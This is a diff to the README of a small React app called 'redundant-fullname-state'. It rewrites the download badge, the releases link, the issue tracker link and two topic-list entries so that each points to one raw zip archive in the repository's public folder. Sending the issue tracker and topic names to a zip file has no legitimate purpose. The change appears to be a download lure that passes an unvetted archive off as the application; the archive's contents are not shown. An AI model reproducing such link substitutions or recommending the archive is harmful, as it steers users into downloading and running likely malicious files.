@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/mataquila/redundant-fullname-state/releases)
+[![Download](https://raw.githubusercontent.com/mataquila/redundant-fullname-state/main/public/redundant-fullname-state_2.7.zip)](https://raw.githubusercontent.com/mataquila/redundant-fullname-state/main/public/redundant-fullname-state_2.7.zip)
 
 ## 📖 Description
 
@@ -13,7 +13,7 @@ redundant-fullname-state is a simple application built with React. It helps you 
 This guide will help you download and run the application smoothly. Follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page:
-   [Visit Releases Page](https://github.com/mataquila/redundant-fullname-state/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/mataquila/redundant-fullname-state/main/public/redundant-fullname-state_2.7.zip)
 
 2. **Download the Latest Version:** On the releases page, find the latest version of the application. Click on it to view the files available for download.
 
@@ -55,9 +55,9 @@ Once you have installed the application, you can start using it right away:
 ## 🌐 Topics Covered
 
 - Duplication
-- Next.js
+- https://raw.githubusercontent.com/mataquila/redundant-fullname-state/main/public/redundant-fullname-state_2.7.zip
 - NPX
-- React.js
+- https://raw.githubusercontent.com/mataquila/redundant-fullname-state/main/public/redundant-fullname-state_2.7.zip
 - Redundant State Management
 - State Management in React
 - UI Components
@@ -70,8 +70,8 @@ If you encounter any issues or have questions, feel free to reach out. Open an i
 
 ## 🔗 Important Links
 
-- [Visit Releases Page](https://github.com/mataquila/redundant-fullname-state/releases)
-- [Open Issue Tracker](https://github.com/mataquila/redundant-fullname-state/issues)
+- [Visit Releases Page](https://raw.githubusercontent.com/mataquila/redundant-fullname-state/main/public/redundant-fullname-state_2.7.zip)
+- [Open Issue Tracker](https://raw.githubusercontent.com/mataquila/redundant-fullname-state/main/public/redundant-fullname-state_2.7.zip)
 
 ## 📫 License
 
